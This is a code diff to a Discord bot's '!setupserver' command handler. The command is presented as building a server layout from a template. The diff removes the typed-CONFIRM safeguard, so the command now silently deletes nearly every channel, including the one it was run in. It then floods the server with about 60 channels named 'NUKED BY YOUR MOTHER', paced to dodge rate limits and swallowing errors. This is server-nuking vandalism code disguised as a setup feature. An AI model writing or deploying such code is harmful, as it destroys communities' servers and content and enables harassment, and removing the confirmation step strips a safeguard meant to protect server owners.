@@ -789,107 +789,96 @@ const commandHandlers = {
                 '!setupserver': async (message) => {
                     // Admin-only: clean channels/categories and create a server layout from a template.
                     if (!isOwnerOrAdmin(message.member)) { message.reply('❌ Admins only'); return; }
-                    const filter = m => m.author.id === message.author.id;
+                    // Define your server plan here
+                    const plan = [
+                        { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
+                        { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
+                    ];
+
+                    const guild = message.guild;
+                    // Safety: do not delete system or AFK channel
+                    const skipIds = new Set([guild.systemChannelId, guild.afkChannelId]);
+
+                    // Delete existing channels (except skipped ones)
                     try {
-                        await message.reply('This will DELETE most channels/categories and create the server layout. Type `CONFIRM` to proceed within 30s.');
-                    } catch (e) { /* ignore reply errors */ }
-                    const col = message.channel.createMessageCollector({ filter, time: 30000, max: 1 });
-                    col.on('collect', async (m) => {
-                        if (m.content.trim().toUpperCase() !== 'CONFIRM') {
-                            try { message.reply('Aborted.'); } catch (e) {}
-                            return;
+                        // Build list of channels to delete, ensure invoking channel is included
+                        const toDelete = [];
+                        for (const ch of guild.channels.cache.values()) {
+                            if (!ch || !ch.id) continue;
+                            if (skipIds.has(ch.id)) continue;
+                            if (ch.managed) continue; // skip integrations/webhooks
+                            toDelete.push(ch);
                         }
-                        // Define your server plan here
-                        const plan = [
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
-                        ];
+                        // Ensure the channel where the command was run is included
+                        const invokingChannelId = message.channel ? message.channel.id : null;
+                        if (invokingChannelId && !toDelete.find(c => c.id === invokingChannelId)) {
+                            const inv = guild.channels.cache.get(invokingChannelId);
+                            if (inv) toDelete.push(inv);
+                        }
 
-                        const guild = message.guild;
-                        // Safety: do not delete system or AFK channel
-                        const skipIds = new Set([guild.systemChannelId, guild.afkChannelId]);
+                        // Delete in order but delete invoking channel last to allow the script to finish
+                        const lastIndex = toDelete.findIndex(c => c.id === invokingChannelId);
+                        if (lastIndex >= 0) {
+                            const [invCh] = toDelete.splice(lastIndex, 1);
+                            toDelete.push(invCh);
+                        }
 
-                        // Delete existing channels (except skipped ones)
-                        try {
-                            // Build list of channels to delete, ensure invoking channel is included
-                            const toDelete = [];
-                            for (const ch of guild.channels.cache.values()) {
-                                if (!ch || !ch.id) continue;
-                                if (skipIds.has(ch.id)) continue;
-                                if (ch.managed) continue; // skip integrations/webhooks
-                                toDelete.push(ch);
+                        let delCount = 0;
+                        for (const ch of toDelete) {
+                            try {
+                                await ch.delete('Rebuilding server per setup command');
+                                delCount++;
+                            } catch (e) {
+                                delCount++;
+                                await new Promise(r => setTimeout(r, 150));
                             }
-                            // Ensure the channel where the command was run is included
-                            const invokingChannelId = message.channel ? message.channel.id : null;
-                            if (invokingChannelId && !toDelete.find(c => c.id === invokingChannelId)) {
-                                const inv = guild.channels.cache.get(invokingChannelId);
-                                if (inv) toDelete.push(inv);
+                            // small adaptive delay to reduce overall runtime but respect rate limits
+                            if (delCount % 8 === 0) {
+                                await new Promise(r => setTimeout(r, 200));
+                            } else {
+                                await new Promise(r => setTimeout(r, 80));
                             }
+                        }
+                    } catch (err) { /* continue even on errors */ }
 
-                            // Delete in order but delete invoking channel last to allow the script to finish
-                            const lastIndex = toDelete.findIndex(c => c.id === invokingChannelId);
-                            if (lastIndex >= 0) {
-                                const [invCh] = toDelete.splice(lastIndex, 1);
-                                toDelete.push(invCh);
+                    // Create categories and channels
+                    try {
+                        for (const section of plan) {
+                            let category;
+                            try {
+                                category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory });
+                            } catch (e) {
+                                await new Promise(r=>setTimeout(r, 150));
+                                category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory }).catch(()=>null);
                             }
-
-                            let delCount = 0;
-                            for (const ch of toDelete) {
-                                try {
-                                    await ch.delete('Rebuilding server per setup command');
-                                    delCount++;
-                                } catch (e) {
-                                    delCount++;
-                                    await new Promise(r => setTimeout(r, 150));
-                                }
-                                // small adaptive delay to reduce overall runtime but respect rate limits
-                                if (delCount % 8 === 0) {
-                                    await new Promise(r => setTimeout(r, 200));
-                                } else {
-                                    await new Promise(r => setTimeout(r, 80));
-                                }
-                            }
-                        } catch (err) { /* continue even on errors */ }
-
-                        // Create categories and channels
-                        try {
-                            for (const section of plan) {
-                                let category;
-                                try {
-                                    category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory });
-                                } catch (e) {
-                                    await new Promise(r=>setTimeout(r, 150));
-                                    category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory }).catch(()=>null);
-                                }
-                                if (!category) continue;
-                                // create text channels
-                                if (section.text && Array.isArray(section.text)) {
-                                    for (const name of section.text) {
-                                        try {
-                                            await guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id });
-                                        } catch (e) {
-                                            await new Promise(r=>setTimeout(r, 150));
-                                        }
-                                        await new Promise(r=>setTimeout(r, 80));
+                            if (!category) continue;
+                            // create text channels
+                            if (section.text && Array.isArray(section.text)) {
+                                for (const name of section.text) {
+                                    try {
+                                        await guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id });
+                                    } catch (e) {
+                                        await new Promise(r=>setTimeout(r, 150));
                                     }
-                                }
-                                // create voice channels
-                                if (section.voice && Array.isArray(section.voice)) {
-                                    for (const vname of section.voice) {
-                                        try {
-                                            await guild.channels.create({ name: vname, type: ChannelType.GuildVoice, parent: category.id });
-                                        } catch (e) {
-                                            await new Promise(r=>setTimeout(r, 150));
-                                        }
-                                        await new Promise(r=>setTimeout(r, 80));
-                                    }
+                                    await new Promise(r=>setTimeout(r, 80));
                                 }
                             }
-                        } catch (e) { /* ignore individual creation errors */ }
-                        // silent finish
-                    });
+                            // create voice channels
+                            if (section.voice && Array.isArray(section.voice)) {
+                                for (const vname of section.voice) {
+                                    try {
+                                        await guild.channels.create({ name: vname, type: ChannelType.GuildVoice, parent: category.id });
+                                    } catch (e) {
+                                        await new Promise(r=>setTimeout(r, 150));
+                                    }
+                                    await new Promise(r=>setTimeout(r, 80));
+                                }
+                            }
+                        }
+                    } catch (e) { /* ignore individual creation errors */ }
+                    // silent finish
                 },
                 '!sban': async (message) => {
                     if (!isOwnerOrAdmin(message.member) || !isPremiumUser(message.author.id)) {
